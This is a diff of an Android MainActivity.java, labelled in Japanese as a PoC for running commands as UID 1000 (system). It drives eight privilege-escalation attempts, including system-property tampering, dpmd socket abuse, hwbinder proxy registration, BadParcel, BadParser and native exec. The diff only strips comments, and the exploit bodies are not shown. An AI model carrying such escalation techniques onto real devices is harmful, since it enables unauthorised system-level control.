@@ -63,8 +63,6 @@ public class MainActivity extends Activity {
     // ================================================================
     private void executeAllMethods() {
         showResult("=== UID 1000 コマンド実行 PoC (全手法・完全実装) ===");
-
-        // 手法① 通常の ServiceManager 経由 (リフレクション)
         showResult("\n[手法1] 通常 ServiceManager.getService()");
         IBinder binder = tryNormalGetService();
         if (binder != null) {
@@ -73,56 +71,42 @@ public class MainActivity extends Activity {
         } else {
             showResult("❌ 取得失敗 (SELinux拒否想定)");
         }
-
-        // 手法② システムプロパティ書き換え
         showResult("\n[手法2] システムプロパティ改ざん");
         if (trySetSystemProperty()) {
             showResult("✅ プロパティ書き換え成功");
         } else {
             showResult("❌ プロパティ書き換え失敗");
         }
-
-        // 手法③ dpmd ソケット直接通信
         showResult("\n[手法3] dpmd ソケット通信");
         if (tryDpmdSocketExploit()) {
             showResult("✅ ソケット通信成功");
         } else {
             showResult("❌ ソケット通信失敗");
         }
-
-        // 手法④ hwbinder 経由
         showResult("\n[手法4] hwbinder 経由取得");
         if (tryHwBinderGetService()) {
             showResult("✅ hwbinder 取得成功");
         } else {
             showResult("❌ hwbinder 取得失敗");
         }
-
-        // 手法⑤ hwbinder プロキシ登録
         showResult("\n[手法5] hwbinder プロキシ登録");
         if (tryHwBinderProxy()) {
             showResult("✅ プロキシ登録成功");
         } else {
             showResult("❌ プロキシ登録失敗");
         }
-
-        // 手法⑥ BadParcel
         showResult("\n[手法6] BadParcel 起動");
         if (tryBadParcelStart()) {
             showResult("✅ BadParcel 起動要求送信");
         } else {
             showResult("❌ BadParcel 起動失敗");
         }
-
-        // 手法⑦ BadParser
         showResult("\n[手法7] BadParser 起動");
         if (tryBadParserStartService()) {
             showResult("✅ BadParser 起動成功");
         } else {
             showResult("❌ BadParser 起動失敗");
         }
-
-        // 手法⑧ ネイティブ
         showResult("\n[手法8] ネイティブ exec");
         if (tryNativeExec()) {
             showResult("✅ ネイティブ exec 成功");
